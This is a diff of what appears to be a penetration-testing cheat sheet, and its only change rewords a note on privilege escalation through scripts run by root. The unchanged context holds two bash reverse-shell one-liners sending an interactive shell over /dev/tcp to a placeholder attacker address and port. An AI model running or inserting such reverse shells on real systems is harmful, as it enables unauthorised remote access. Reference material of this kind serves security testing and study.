@@ -151,7 +151,7 @@ sudo python -m http.server 80
 ```
 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
 ```
-> If there's a script that is executed by root, modifing the script file may be a priv escalation:
+> If there's a script that is executed by root, modifing the script file may be a privileg escalation vector:
 ```
 bash -i >& /dev/tcp/[attack_ip]/[attack_port] 0>&1; 
 ```
